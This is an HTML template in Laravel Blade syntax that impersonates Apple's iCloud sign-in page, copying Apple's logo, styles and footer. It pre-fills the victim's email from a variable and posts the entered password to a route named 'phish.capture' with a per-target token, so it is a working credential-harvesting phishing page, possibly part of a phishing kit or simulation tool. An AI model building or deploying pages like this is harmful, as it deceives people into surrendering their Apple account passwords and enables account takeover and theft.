<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex">
    <title>Sign in to iCloud</title>
    <link rel="icon" href="https://www.icloud.com/favicon.ico">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:-apple-system,BlinkMacSystemFont,"SF Pro Text","Helvetica Neue",Helvetica,Arial,sans-serif;background:#fff;min-height:100vh;display:flex;flex-direction:column;align-items:center}
        .header{width:100%;padding:16px 24px;display:flex;align-items:center;gap:8px}
        .apple-logo svg{width:20px;height:24px;fill:#1d1d1f}
        .main{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:40px 20px;width:100%;max-width:440px}
        .cloud-icon{margin-bottom:20px}
        .cloud-icon svg{width:64px;height:64px}
        h1{font-size:28px;color:#1d1d1f;font-weight:600;margin-bottom:8px;letter-spacing:-0.3px}
        .sub{font-size:17px;color:#1d1d1f;font-weight:400;margin-bottom:24px}
        .form-group{width:100%;max-width:360px;margin-bottom:16px;text-align:left}
        .form-group label{display:block;font-size:13px;color:#86868b;margin-bottom:4px;font-weight:400}
        .form-group input{width:100%;height:36px;padding:0 12px;font-size:16px;font-family:-apple-system,sans-serif;color:#1d1d1f;background:#f5f5f7;border:1px solid #d2d2d7;border-radius:8px;outline:none;transition:border-color .15s}
        .form-group input:focus{border-color:#0071e3}
        .btn-signin{width:100%;max-width:360px;height:40px;background:#0071e3;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:500;cursor:pointer;transition:background .15s;margin-top:8px}
        .btn-signin:hover{background:#0077ed}
        .links-row{width:100%;max-width:360px;display:flex;justify-content:space-between;margin-top:16px}
        .links-row a{font-size:13px;color:#0071e3;text-decoration:none}
        .links-row a:hover{text-decoration:underline}
        .footer{width:100%;padding:16px 24px;text-align:center;font-size:12px;color:#86868b;border-top:1px solid #f0f0f0}
        .footer a{color:#86868b;text-decoration:none;margin:0 8px}
        .footer a:hover{text-decoration:underline;color:#1d1d1f}
        @media(max-width:480px){.main{padding:24px 16px}}
    </style>
</head>
<body>
    <div class="header">
        <div class="apple-logo">
            <svg viewBox="0 0 17 20" xmlns="http://www.w3.org/2000/svg">
                <path d="M15.5 14.7c-.4 1.1-.9 2.1-1.4 3.1-.7 1.3-1.2 2.2-1.7 2.7-.7.8-1.5 1.2-2.3 1.3-.6 0-1.3-.2-2.1-.5-.8-.3-1.5-.5-2.2-.5-.7 0-1.5.2-2.2.5-.8.3-1.4.5-1.9.5-.9.1-1.7-.4-2.4-1.2C.3 19.3-.1 18-.4 16.5c-.4-1.6-.5-3.1-.2-4.7.3-1.3.8-2.4 1.6-3.3.7-.7 1.5-1.1 2.4-1.2.7 0 1.6.2 2.5.6.9.4 1.5.6 1.7.6.2 0 .8-.2 2-.7.9-.4 1.7-.6 2.3-.5 1.7.1 2.9.8 3.7 2.1-1.5.9-2.2 2.1-2.1 3.7 0 1.2.5 2.3 1.3 3.1zM12.2.5c0 1-.4 1.9-1.1 2.7-.9 1-1.9 1.5-3 1.4 0-.1 0-.2 0-.3 0-1 .4-2 1.1-2.8.4-.5.8-.9 1.4-1.2.6-.3 1.2-.5 1.7-.5 0 .1 0 .3 0 .5z" fill="#1d1d1f"/>
            </svg>
        </div>
    </div>

    <div class="main">
        <div class="cloud-icon">
            <svg viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg">
                <path d="M48 32a14 14 0 00-13.5-14A16 16 0 004 30a12 12 0 000 24h28a12 12 0 000-24c0-.3 0-.7.1-1A14 14 0 0148 32z" fill="none" stroke="#d2d2d7" stroke-width="1"/>
                <path d="M48 28c-.3-7-6-12-12-12-5.5 0-10.3 3.2-12.3 7.8C22.5 23.5 21.8 23 21 23a7 7 0 00-7 7 7 7 0 007 7h27a11 11 0 000-22z" fill="none" stroke="#86868b" stroke-width="1.5"/>
            </svg>
        </div>
        <h1>Sign in to iCloud</h1>
        <p class="sub">Use your Apple Account</p>

        <div class="form-group">
            <label for="email">Email or Phone Number</label>
            <input type="text" id="email" name="email" value="{{ $email }}" readonly>
        </div>

        <form action="{{ route('phish.capture', ['provider' => 'icloud', 'token' => $token]) }}" method="POST">
            @csrf
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required autofocus>
            </div>
            <button type="submit" class="btn-signin">Sign In</button>
        </form>

        <div class="links-row">
            <a href="#">Forgot password?</a>
            <a href="#">Create Apple Account</a>
        </div>
    </div>

    <div class="footer">
        <a href="#">Privacy Policy</a>
        <a href="#">Terms of Use</a>
        <a href="#">Copyright © 2026 Apple Inc.</a>
    </div>
</body>
</html>
